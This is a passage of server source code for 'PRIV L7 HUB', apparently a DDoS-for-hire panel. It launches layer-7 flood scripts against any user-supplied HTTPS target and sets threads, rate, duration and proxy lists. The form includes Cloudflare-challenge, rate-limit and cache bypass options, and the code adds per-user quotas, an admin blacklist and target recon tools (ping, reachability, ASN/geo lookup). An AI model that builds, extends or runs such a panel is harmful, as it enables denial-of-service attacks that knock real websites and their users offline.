      return res.status(429).json({ error: 'You already have ' + userActive + ' active session(s). Your limit is ' + limits.maxConcurrent + '.' });
  }

  const body = req.body || {};
  const method = getMethodById(body.method);
  if (!method) return res.status(400).json({ error: 'Unknown method.' });

  const methodPath = path.join(SCRIPT_DIR, method.file);
  if (!fs.existsSync(methodPath)) return res.status(400).json({ error: 'Method file missing: ' + method.file });

  let t;
  try { t = validateTarget(String(body.target || '')); } catch (e) { return res.status(400).json({ error: e.message }); }

  if (isBlacklisted(t.host)) return res.status(403).json({ error: 'This target is blacklisted.' });

  const d = Number(body.duration);
  const th = Number(body.threads);
  const r = Number(body.rate);

  if (!Number.isInteger(d) || d < 1) return res.status(400).json({ error: 'Duration must be at least 1.' });
  if (!isAdmin && limits.maxDuration > 0 && d > limits.maxDuration) return res.status(400).json({ error: 'Duration must be 1-' + limits.maxDuration + ' (your limit).' });
  if (!Number.isInteger(th) || th < 1) return res.status(400).json({ error: 'Threads must be at least 1.' });
  if (!isAdmin && limits.maxThreads > 0 && th > limits.maxThreads) return res.status(400).json({ error: 'Threads must be 1-' + limits.maxThreads + ' (your limit).' });
  if (!Number.isInteger(r) || r < 1) return res.status(400).json({ error: 'Rate must be at least 1.' });
  if (!isAdmin && limits.maxRate > 0 && r > limits.maxRate) return res.status(400).json({ error: 'Rate must be 1-' + limits.maxRate + ' (your limit).' });

  let proxyfile = 'proxy.txt';
  if (method.fields.indexOf('proxyfile') !== -1) {
    const requested = String(body.proxyfile || 'proxy.txt');
    if (requested !== 'proxy.txt' && requested !== 'iran.txt')
      return res.status(400).json({ error: 'Invalid proxy file.' });
    proxyfile = requested;
  }

  const input = {
    target: t.url, duration: d, threads: th, rate: r,
    reqmethod: String(body.reqmethod || 'GET').toUpperCase() === 'POST' ? 'POST' : 'GET',
    query: body.query && ['0', '1', '2', '3'].includes(String(body.query)) ? String(body.query) : '0',
    limit: body.limit === true || body.limit === 'true' || body.limit === 'on',
    delay: Number(body.delay || 0),
    proxyfile: proxyfile,
    cookies: body.cookies === true || body.cookies === 'true' || body.cookies === 'on',
    headers: body.headers === true || body.headers === 'true' || body.headers === 'on',
    cache: body.cache === true || body.cache === 'true' || body.cache === 'on'
  };

  const cmdArgs = method.buildArgs(input);
  const commandPreview = method.buildCommand(input);

  const id = crypto.randomUUID();

  const child = spawn(process.execPath, [methodPath].concat(cmdArgs), {
    cwd: SCRIPT_DIR,
    shell: false,
    stdio: ['ignore', 'pipe', 'pipe'],
    detached: true,
    env: {
      PATH: process.env.PATH || '',
      NODE_ENV: 'production',
      PRIVHUB_SESSION_ID: id
    }
  });

  const s = {
    id: id,
    method: method.name,
    target: t.host,
    duration: d,
    startedAt: Date.now(),
    status: 'running',
    owner: req.session.user.username,
    child: child,
    command: commandPreview
  };

  sessions.set(id, s);
  logs.set(id, '');
  persistSessions();

  logChunk(id, '$ ' + commandPreview + '\n\n');

  child.stdout.on('data', function (c) { logChunk(id, c); });
  child.stderr.on('data', function (c) { logChunk(id, c); });

  child.on('error', function (e) {
    logChunk(id, '\nProcess error: ' + e.message);
    const existing = sessions.get(id);
    if (existing && existing.status === 'running') {
      existing.status = 'done';
      clearTimeout(existing.timer);
      const linger = setTimeout(function () {
        sessions.delete(id);
        logs.delete(id);
        persistSessions();
      }, 15000);
      linger.unref();
    }
  });

  child.on('close', function (code, signal) {
    logChunk(id, '\nExited: code=' + code + ', signal=' + signal);
    const existing = sessions.get(id);
    if (existing && existing.status === 'running') {
      existing.status = 'done';
      clearTimeout(existing.timer);
      const linger = setTimeout(function () {
        sessions.delete(id);
        logs.delete(id);
        persistSessions();
      }, 15000);
      linger.unref();
    } else {
      sessions.delete(id);
      persistSessions();
    }
    audit('process_exit', s.owner, { id: id, code: code, signal: signal });
  });

  s.timer = setTimeout(function () { stopSession(id, 'duration_expired'); }, d * 1000);
  s.timer.unref();

  audit('process_started', s.owner, { id: id, method: s.method, target: t.host, duration: d, threads: th, rate: r, command: commandPreview });
  res.status(201).json({ session: viewSession(s) });
});

app.delete('/api/sessions/:id', auth, function (req, res) {
  const s = sessions.get(req.params.id);
  if (!s) return res.status(404).json({ error: 'Process is not running.' });

  const isAdmin = req.session.user.role === 'admin';
  const isOwner = s.owner === req.session.user.username;
  if (!isAdmin && !isOwner) {
    return res.status(403).json({ error: 'You can only stop your own processes.' });
  }

  const cd = isAdmin ? 0 : getCooldownRemaining(req.session.user.username);

  res.json({ ok: true, cooldownRemaining: cd });

  setImmediate(function () {
    try { stopSession(s.id, isAdmin && !isOwner ? 'admin_force' : 'manual'); }
    catch (e) { console.error('[stop-session]', e); }
  });
});

/* ---------- TOOLS API ---------- */
app.post('/api/tools/ping', auth, async function (req, res) {
  const body = req.body || {};
  const host = normalizeHost(body.host);
  if (!host) return res.status(400).json({ error: 'Host required.' });
  if (!/^[a-z0-9.\-:]+$/i.test(host)) return res.status(400).json({ error: 'Invalid host.' });
  try {
    const data = await runServerPing(host);
    audit('tool_ping', req.session.user.username, { host: host, received: data.received, lost: data.lost });
    res.json(data);
  } catch (e) { res.status(500).json({ error: e.message || 'Ping failed.' }); }
});

app.post('/api/tools/https', auth, async function (req, res) {
  const body = req.body || {};
  const host = normalizeHost(body.host);
  if (!host) return res.status(400).json({ error: 'Host required.' });
  if (!/^[a-z0-9.\-:]+$/i.test(host)) return res.status(400).json({ error: 'Invalid host.' });
  try {
    const data = await checkHttpsUrl(host, 8000);
    audit('tool_https', req.session.user.username, { host: host, ok: data.ok, status: data.status });
    res.json(data);
  } catch (e) { res.status(500).json({ error: e.message || 'Check failed.' }); }
});

app.post('/api/tools/asn', auth, async function (req, res) {
  const body = req.body || {};
  const host = normalizeHost(body.host);
  if (!host) return res.status(400).json({ error: 'Host required.' });
  if (!/^[a-z0-9.\-]+$/i.test(host)) return res.status(400).json({ error: 'Invalid host.' });

  try {
    const geo = await httpGetJson(
      'http://ip-api.com/json/' + encodeURIComponent(host) +
      '?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,query,reverse,mobile,proxy,hosting',
      8000
    );
    if (!geo || geo.status !== 'success') {
      return res.status(404).json({ error: 'Lookup failed for ' + host });
    }
    const asNum = (geo.as || '').split(' ')[0] || '';
    const asName = geo.asname || (geo.as || '').replace(asNum, '').trim() || geo.isp || '';
    audit('tool_asn', req.session.user.username, { host: host, asn: asNum });
    res.json({
      host: host,
      ip: geo.query,
      country: geo.country,
      countryCode: geo.countryCode,
      region: geo.regionName,
      city: geo.city,
      zip: geo.zip,
      lat: geo.lat,
      lon: geo.lon,
      timezone: geo.timezone,
      isp: geo.isp,
      org: geo.org,
      asn: asNum,
      asName: asName,
      reverse: geo.reverse || '',
      flags: { mobile: !!geo.mobile, proxy: !!geo.proxy, hosting: !!geo.hosting }
    });
  } catch (e) {
    res.status(500).json({ error: e.message || 'ASN lookup failed.' });
  }
});

/* ---------- UI ---------- */
const HTML = [
'<!doctype html>',
'<html lang="en"><head><meta charset="utf-8">',
'<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">',
'<meta name="theme-color" content="#030408">',
'<title>PRIV L7 HUB</title>',
'<link rel="stylesheet" href="/ui.css">',
'<script src="https://telegram.org/js/telegram-web-app.js"></script>',
'</head><body>',

'<div class="ambient-glows">',
'<div class="glow-orb orb-1"></div>',
'<div class="glow-orb orb-2"></div>',
'<div class="glow-orb orb-3"></div>',
'</div>',

'<div id="app">',

'<aside id="sidebar">',
'<div class="sidebar-brand"><span class="brand-dot"></span><div><b>PRIV L7</b><small>HUB</small></div></div>',
'<nav class="sidebar-nav">',
'<button data-page="hub" class="active"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg><span>Hub</span></button>',
'<button data-page="settings"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09a1.65 1.65 0 0 0-1-1.51 1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09a1.65 1.65 0 0 0 1.51-1 1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l.06-.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg><span>Settings</span></button>',
'<button data-page="tools"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg><span>Tools</span></button>',
'<div class="sidebar-divider"></div>',
'<button data-page="login" id="navLogin"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg><span>Login</span></button>',
'<button data-page="register" id="navRegister"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="8.5" cy="7" r="4"/><line x1="20" y1="8" x2="20" y2="14"/><line x1="23" y1="11" x2="17" y2="11"/></svg><span>Sign Up</span></button>',
'<button id="navLogout" class="hide"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg><span>Logout</span></button>',
'<div class="sidebar-divider"></div>',
'<a href="https://t.me/privflood" target="_blank" rel="noopener"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg><span>Contact</span></a>',
'</nav>',
'<small class="sidebar-footer">PRIV L7 HUB</small>',
'</aside>',
'<div id="sidebarBackdrop" class="hide"></div>',

'<div class="content-wrap">',
'<header id="appHeader">',
'<button id="menu" aria-label="Menu"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button>',
'<div class="brand"><span class="brand-dot"></span><div><b>PRIV L7</b><small>HUB</small></div></div>',
'<div style="width:40px"></div>',
'</header>',

'<main>',

'<section id="login" class="panel login hide">',
'<div class="login-badge">SECURE ACCESS</div>',
'<h1>Welcome back.</h1>',
'<p>Authenticate to manage your L7 operations. New here? <a href="#" id="toRegisterLink">Create an account</a>.</p>',
'<form id="loginForm">',
'<label>Username<input name="username" autocomplete="username" required></label>',
'<label>Password<input name="password" type="password" autocomplete="current-password" required></label>',
'<label>Human verification',
'<div class="captcha-row">',
'<span class="captcha-q" id="loginCaptchaQuestion">…</span>',
'<button type="button" id="loginCaptchaRefresh" class="captcha-refresh" aria-label="New captcha">↻</button>',
'</div>',
'<input name="captchaAnswer" type="number" placeholder="Enter the sum" required autocomplete="off" style="margin-top:8px;">',
'</label>',
'<button class="primary" id="loginBtn" type="submit"><span class="btn-label">Authenticate</span><span class="btn-dots hide"><i></i><i></i><i></i></span><span class="btn-arrow">→</span></button>',
'<p id="loginErr" class="err"></p></form></section>',

'<section id="register" class="panel login hide">',
'<div class="login-badge">CREATE ACCOUNT</div>',
'<h1>Join the Hub.</h1>',
'<p>Register to deploy L7 operations. Already registered? <a href="#" id="toLoginLink">Sign in</a>.</p>',
'<form id="registerForm" autocomplete="off">',
'<label>Username<input name="username" autocomplete="username" required minlength="3" maxlength="32"></label>',
'<label>Password<input name="password" type="password" autocomplete="new-password" required minlength="3" placeholder="At least 3 characters"></label>',
'<label>Human verification',
'<div class="captcha-row">',
'<span class="captcha-q" id="captchaQuestion">…</span>',
'<button type="button" id="captchaRefresh" class="captcha-refresh" aria-label="New captcha">↻</button>',
'</div>',
'<input name="captchaAnswer" type="number" placeholder="Enter the sum" required autocomplete="off" style="margin-top:8px;">',
'</label>',
'<button class="primary" id="registerBtn" type="submit"><span class="btn-label">Create account</span><span class="btn-arrow">→</span></button>',
'<p id="registerErr" class="err"></p></form></section>',

'<section id="hub" class="hide">',
'<div class="intro"><small class="eyebrow">ATTACK HUB</small>',
'<h1>Welcome to <span>Priv L7</span> Hub.</h1>',
'<p>Your private command center for L7 operations.</p></div>',

'<div class="stats">',
'<div class="stat"><div class="stat-head"><small>ACTIVE SESSIONS</small><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div><b id="capacity">0/3</b><span id="slots">3 slots available</span></div>',
'<div class="stat"><div class="stat-head"><small>YOUR ROLE</small><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l3 6 6 1-4 4 1 6-6-3-6 3 1-6-4-4 6-1z"/></svg></div><b id="role">Guest</b><span id="limitsLine">Sign in to deploy</span></div>',
'</div>',

'<div class="panel"><small class="eyebrow">NEW PROCESS</small>',
'<h2>Deploy a new process</h2>',
'<form id="launch" autocomplete="off">',
'<label>Method<select name="method" id="methodSelect" required></select>',
'<small id="methodsHint" style="display:block;margin-top:6px;"></small></label>',
'<div id="reqMethodWrap" class="hide">',
'<label>Request type<select name="reqmethod" id="reqMethodSelect">',
'<option value="GET" selected>GET</option>',
'<option value="POST">POST</option>',
'</select></label>',
'</div>',
'<div id="cRushProxyWrap" class="hide">',
'<label>Proxy file<select name="proxyfile" id="cRushProxySelect">',
'<option value="proxy.txt" selected>proxy.txt</option>',
'<option value="iran.txt">iran.txt</option>',
'</select></label>',
'</div>',
'<label>Target URL <small>HTTPS · any non-blacklisted hostname</small>',
'<div class="url"><span>https://</span><input name="target" id="targetInput" placeholder="target.com" required></div></label>',
'<div class="cols">',
'<label>Duration · seconds<input name="duration" id="durationInput" type="number" value="60" min="1" required></label>',
'<label>Threads<input name="threads" id="threadsInput" type="number" value="8" min="1" required></label>',
'</div>',
'<label>Rate / Ratelimit<input name="rate" id="rateInput" type="number" value="90" min="1" required></label>',
'<div id="bypassFields" class="hide">',
'<label>Query<select name="query" id="querySelect">',
'<option value="0">0 · none</option>',
'<option value="1" selected>1 · ?__cf_chl_rt_tk=&hellip;</option>',
'<option value="2">2 · /randompath</option>',
'<option value="3">3 · ?q=rand&amp;rand</option>',
'</select></label>',
'<label>Delay · ms<input name="delay" id="delayInput" type="number" value="0" min="0" max="50"></label>',
'<label>Options',
'<div style="display:flex;gap:20px;margin-top:10px;font-size:13px;color:var(--text-2);">',
'<label style="display:flex;align-items:center;gap:6px;margin:0;font-size:13px;"><input type="checkbox" name="limit" id="limitInput" style="width:auto;margin:0;"> --limit <small style="color:var(--muted);font-size:10px;">(bypass rate limit)</small></label>',
'</div></label>',
'</div>',
'<div id="flagFields" class="hide">',
'<label>Flags',
'<div style="display:flex;flex-direction:column;gap:10px;margin-top:10px;font-size:13px;color:var(--text-2);">',
'<label style="display:flex;align-items:center;gap:6px;margin:0;font-size:13px;"><input type="checkbox" name="cookies" id="cookiesInput" style="width:auto;margin:0;" checked> -c <small style="color:var(--muted);font-size:10px;">(cookies)</small></label>',
'<label style="display:flex;align-items:center;gap:6px;margin:0;font-size:13px;"><input type="checkbox" name="headers" id="headersInput" style="width:auto;margin:0;" checked> -h <small style="color:var(--muted);font-size:10px;">(headers)</small></label>',
'<label id="cacheWrap" style="display:none;align-items:center;gap:6px;margin:0;font-size:13px;"><input type="checkbox" name="cache" id="cacheInput" style="width:auto;margin:0;"> -ch true <small style="color:var(--muted);font-size:10px;">(cache bypass)</small></label>',
'</div></label>',
'</div>',
'<div class="notice"><div class="notice-label">Command preview</div><code id="cmdPreview">node &lt;method&gt; &hellip;</code></div>',
'<div id="cooldownNotice" class="notice hide" style="background:rgba(244,63,94,.08);border-color:rgba(244,63,94,.3);border-left-color:var(--danger);">',
'<div class="notice-label" style="color:var(--danger);">Cooldown active</div>',
'<span id="cooldownText">Cooldown is set — wait 20 seconds.</span>',
'</div>',
'<button class="primary" id="startBtn" type="submit">Deploy process <span>↗</span></button>',
'<p id="launchErr" class="err"></p></form></div>',

'<div class="headrow"><h2>Live sessions</h2>',
'<button id="refresh" class="subtle" type="button">↻ Sync</button></div>',
'<div id="sessions"></div></section>',

'<section id="settings" class="hide">',
'<div class="intro"><small class="eyebrow">PREFERENCES / SETTINGS</small>',
'<h1>Your account.</h1><p>Manage credentials and administrative configuration.</p></div>',

'<div class="settings-partition">',
'<div class="partition-header"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.778-7.778zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg><span>Security &amp; Credentials</span></div>',
'<div class="panel"><small class="eyebrow">CREDENTIALS</small><h2>Update account</h2>',
'<form id="account">',
'<label>Current password<input type="password" name="currentPassword" required></label>',
'<label>New username<input name="newUsername" placeholder="Leave blank to keep current"></label>',
'<label>New password<input type="password" name="newPassword" minlength="3" placeholder="At least 3 characters"></label>',
'<button class="primary" type="submit">Save changes <span>→</span></button>',
'<p id="accountMsg"></p></form></div>',
'</div>',

'<div id="admin" class="panel hide settings-partition">',
'<div class="partition-header"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg><span>Operator Management</span></div>',
'<small class="eyebrow">ADMINISTRATOR</small>',
'<h2>Provision operator</h2>',
'<p style="font-size:12px;color:var(--muted);margin-top:-8px;">Set any limit to 0 for unlimited. Cooldown default 20s. Expiry: use <code>7d</code>, <code>30d</code>, an ISO date, or leave blank for never. Role: <code>pending</code>, <code>user</code>, or <code>admin</code>.</p>',
'<form id="createUser">',
'<label>Username<input name="username" required minlength="3" maxlength="32"></label>',
'<label>Temporary password<input name="password" type="password" required minlength="3" placeholder="At least 3 characters"></label>',
'<div class="cols">',
'<label>Max duration · s<input type="number" name="maxDuration" value="0" min="0" placeholder="0 = unlimited"></label>',
'<label>Max threads<input type="number" name="maxThreads" value="0" min="0" placeholder="0 = unlimited"></label>',
'</div>',
'<div class="cols">',
'<label>Max rate<input type="number" name="maxRate" value="0" min="0" placeholder="0 = unlimited"></label>',
'<label>Max concurrent<input type="number" name="maxConcurrent" value="0" min="0" placeholder="0 = unlimited"></label>',
'</div>',
'<div class="cols">',
'<label>Cooldown · s<input type="number" name="cooldown" value="20" min="0" placeholder="20"></label>',
'<label>Expires in<input name="expiresAt" placeholder="7d · 30d · 2026-01-01 · blank=never"></label>',
'</div>',
'<label>Role<select name="role"><option value="user" selected>user</option><option value="pending">pending</option><option value="admin">admin</option></select></label>',
'<button class="primary" type="submit">Create account <span>+</span></button>',
'<p id="userMsg"></p></form><div id="users"></div></div>',

'<div id="adminBlacklist" class="panel hide settings-partition">',
'<div class="partition-header"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg><span>Target Blacklist</span></div>',
'<small class="eyebrow">ADMINISTRATOR</small>',
'<h2>Blocked targets</h2>',
'<p style="font-size:12px;color:var(--muted);margin-top:-8px;">Block any host. Type <code>example.com</code>, <code>*.example.com</code>, or paste a full URL — normalized automatically.</p>',
'<form id="addBlacklist" autocomplete="off">',
'<label>Host / URL<input name="pattern" placeholder="example.com  ·  *.example.com  ·  https://example.com/home" required></label>',
'<button class="primary" type="submit">Add to blocklist <span>+</span></button>',
'<p id="blacklistMsg"></p></form>',
'<div id="blacklistList"></div></div>',
'</section>',

'<section id="tools" class="hide">',
'<div class="intro"><small class="eyebrow">UTILITIES / TOOLS</small>',
'<h1>Utilities.</h1><p>Network diagnostics and inspection tools.</p></div>',
'<div class="panel">',
'<button class="tool-btn" id="toolPingBtn" type="button">',
'<span class="tool-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg></span>',
'<span class="tool-text"><b>Ping</b><small>TCP probe latency test</small></span><span class="tool-arrow">→</span></button>',
'<button class="tool-btn" id="toolHttpsBtn" type="button">',
'<span class="tool-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></span>',
'<span class="tool-text"><b>HTTPS Status</b><small>Check if a site is online</small></span><span class="tool-arrow">→</span></button>',
'<button class="tool-btn" id="toolAsnBtn" type="button">',
'<span class="tool-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg></span>',
'<span class="tool-text"><b>ASN Lookup</b><small>Owner org, ASN, geo of any host</small></span><span class="tool-arrow">→</span></button>',
'</div>',
'<div id="toolPing" class="panel hide">',
'<small class="eyebrow">PING</small>',
'<h2>Latency probe</h2>',
'<p style="font-size:12px;color:var(--muted);margin-top:-8px;">Enter an IP or domain to probe 5 times via TCP.</p>',
'<label>Host<input id="pingHost" placeholder="example.com or 1.1.1.1" autocomplete="off"></label>',
'<button class="primary" id="pingRunBtn" type="button">Run ping <span>→</span></button>',
'<div class="tool-output" id="pingOutput"></div>',
'</div>',
'<div id="toolHttps" class="panel hide">',
'<small class="eyebrow">HTTPS STATUS</small>',
'<h2>Reachability check</h2>',
'<p style="font-size:12px;color:var(--muted);margin-top:-8px;">Verify whether a website is online or offline.</p>',
'<label>URL<div class="url"><span>https://</span><input id="httpsHost" placeholder="example.com" autocomplete="off"></div></label>',
'<button class="primary" id="httpsRunBtn" type="button">Check status <span>→</span></button>',
'<div class="tool-output" id="httpsOutput"></div>',
'</div>',
'<div id="toolAsn" class="panel hide">',
'<small class="eyebrow">ASN LOOKUP</small>',
'<h2>Network origin</h2>',
'<p style="font-size:12px;color:var(--muted);margin-top:-8px;">Enter any URL or hostname. Returns IP, ASN, org, geo.</p>',
'<label>Target<div class="url"><span>https://</span><input id="asnHost" placeholder="klar.gg" autocomplete="off"></div></label>',
'<button class="primary" id="asnRunBtn" type="button">Lookup <span>→</span></button>',
'<div class="tool-output" id="asnOutput"></div>',
'</div>',
'</section>',
'</main>',
'</div>',

'<div id="toast" class="hide"></div>',
'</div>',
'<script src="/ui.js" defer></script>',
'</body></html>'
].join('\n');

const UI_CSS = [
':root{',
'color-scheme:dark;',
'--bg:#030408;--bg-surface:rgba(15,18,28,.65);',
'--panel:rgba(22,27,40,.6);--panel-border:rgba(255,255,255,.08);',
'--text:#f1f5f9;--text-secondary:#94a3b8;--muted:#64748b;--dim:#334155;',
'--accent-cyan:#38bdf8;--accent-indigo:#818cf8;--accent-purple:#c084fc;',
'--accent-grad:linear-gradient(135deg,#38bdf8 0%,#818cf8 50%,#c084fc 100%);',
'--danger:#f43f5e;--danger-bg:rgba(244,63,94,.1);--danger-line:rgba(244,63,94,.3);',
'--success:#22c55e;--warn:#f59e0b;',
'--radius:20px;--radius-sm:14px;--radius-xs:10px;',
'--shadow:0 16px 40px rgba(0,0,0,.5),0 0 0 1px rgba(255,255,255,.04);',
'--glow:0 0 0 4px rgba(56,189,248,.15);',
'}',
'*{box-sizing:border-box}',
'html,body{height:100%;scroll-behavior:smooth}',
'body{margin:0;background:var(--bg);color:var(--text);font:15px/1.55 -apple-system,BlinkMacSystemFont,"SF Pro Text","SF Pro Display","Inter",system-ui,sans-serif;min-height:100vh;min-height:var(--tg-viewport-height,100vh);-webkit-font-smoothing:antialiased;overflow-x:hidden}',

'.ambient-glows{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}',
'.glow-orb{position:absolute;border-radius:50%;filter:blur(90px);opacity:.35;will-change:transform}',
'.orb-1{top:-10%;left:20%;width:500px;height:500px;background:radial-gradient(circle,#38bdf8,transparent 70%);animation:orbFloat1 14s ease-in-out infinite alternate}',
'.orb-2{top:40%;right:-10%;width:600px;height:600px;background:radial-gradient(circle,#818cf8,transparent 70%);animation:orbFloat2 18s ease-in-out infinite alternate}',
'.orb-3{bottom:-10%;left:30%;width:550px;height:550px;background:radial-gradient(circle,#c084fc,transparent 70%);animation:orbFloat3 16s ease-in-out infinite alternate}',
'@keyframes orbFloat1{0%{transform:translate(0,0) scale(1)}100%{transform:translate(80px,60px) scale(1.15)}}',
'@keyframes orbFloat2{0%{transform:translate(0,0) scale(1)}100%{transform:translate(-90px,100px) scale(1.2)}}',
'@keyframes orbFloat3{0%{transform:translate(0,0) scale(1)}100%{transform:translate(70px,-80px) scale(1.1)}}',

'body::after{content:"";position:fixed;inset:0;background-image:radial-gradient(rgba(255,255,255,.03) 1px,transparent 1px);background-size:32px 32px;pointer-events:none;z-index:0}',

'button,input,select{font:inherit}button{cursor:pointer;color:inherit;border:0;background:transparent}.hide{display:none!important}',
'a{color:var(--accent-cyan);text-decoration:none;transition:opacity .2s}',
'a:hover{opacity:.8}',
'input::placeholder{color:var(--dim)}',
'input[type="number"]{-moz-appearance:textfield}',
'input[type="number"]::-webkit-outer-spin-button,input[type="number"]::-webkit-inner-spin-button{-webkit-appearance:none;margin:0}',

'#sidebar{position:fixed;top:0;left:0;bottom:0;width:260px;background:rgba(5,7,14,.94);backdrop-filter:blur(30px);-webkit-backdrop-filter:blur(30px);border-right:1px solid var(--panel-border);padding:22px 14px;z-index:25;display:flex;flex-direction:column;gap:4px;transition:transform .3s cubic-bezier(0.16,1,0.3,1)}',
'#sidebar .sidebar-brand{display:flex;align-items:center;gap:12px;padding:4px 12px 20px;border-bottom:1px solid var(--panel-border);margin-bottom:12px;font-size:11px;letter-spacing:.18em;font-weight:700}',
'#sidebar .sidebar-brand b{display:block;color:var(--text);font-size:13px;letter-spacing:.08em;line-height:1}',
'#sidebar .sidebar-brand small{display:block;color:var(--muted);font-size:9px;letter-spacing:.28em;margin-top:2px}',
'.sidebar-nav{display:flex;flex-direction:column;gap:3px}',
'.sidebar-nav button,.sidebar-nav a{background:transparent;border:0;color:var(--text-secondary);text-align:left;padding:11px 14px;border-radius:11px;font-size:13.5px;text-decoration:none;display:flex;align-items:center;gap:12px;transition:all .18s;font-weight:600;cursor:pointer;width:100%}',
'.sidebar-nav button:hover,.sidebar-nav a:hover{background:rgba(56,189,248,.08);color:var(--accent-cyan)}',
'.sidebar-nav button.active{background:linear-gradient(135deg,rgba(56,189,248,.15),rgba(192,132,252,.12));color:var(--text);border:1px solid rgba(56,189,248,.25)}',
'.sidebar-nav button svg,.sidebar-nav a svg{opacity:.85;flex-shrink:0}',
'.sidebar-divider{height:1px;background:var(--panel-border);margin:8px 12px}',
'.sidebar-footer{margin-top:auto;color:var(--muted);font-size:9.5px;padding:12px;letter-spacing:.3em;text-align:center}',
'#sidebarBackdrop{position:fixed;inset:0;background:rgba(0,0,0,.55);backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px);z-index:24}',
'@media (max-width:900px){#sidebar{transform:translateX(-100%)}#sidebar.open{transform:translateX(0);box-shadow:0 0 60px rgba(0,0,0,.8)}}',
